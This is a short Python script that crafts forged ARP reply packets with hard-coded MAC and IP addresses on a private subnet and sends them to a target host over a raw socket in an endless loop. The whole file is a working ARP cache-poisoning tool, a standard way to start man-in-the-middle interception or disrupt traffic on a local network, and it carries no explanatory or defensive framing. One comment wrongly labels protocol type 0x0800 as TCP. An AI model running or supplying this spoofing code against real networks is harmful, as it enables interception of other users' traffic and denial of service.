import struct
import socket
import binascii

rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW,
                          socket.htons(0x0003))
rawSocket.bind(("ens33", socket.htons(0x0003)))

source_mac = binascii.unhexlify('00:50:56:29:6c:85'.replace(':', ''))
#b'\x00\x00\x00\x00\x00\x00' sender mac address
dest_mac = binascii.unhexlify('00:0c:29:db:9a:b2'.replace(':', ''))
#  b'\xff\xff\xff\xff\xff\xff'  target mac address

source_ip = "192.168.21.139"  # sender ip address
dest_ip = "192.168.21.141"  # target ip address

# Ethernet Header
protocol = 0x0806  # 0x0806 for ARP
eth_hdr = struct.pack("!6s6sH", dest_mac, source_mac, protocol)

# ARP header
htype = 1  # Hardware_type ethernet
ptype = 0x0800  # Protocol type TCP
hlen = 6  # Hardware address Len
plen = 4  # Protocol addr. len
operation = 2  # 1=request/2=reply
src_ip = socket.inet_aton(source_ip)
dst_ip = socket.inet_aton(dest_ip)
arp_hdr = struct.pack("!HHBBH6s4s6s4s", htype, ptype, hlen, plen, operation,
                      source_mac, src_ip, dest_mac, dst_ip)

packet = eth_hdr + arp_hdr
while True :
	rawSocket.send(packet)
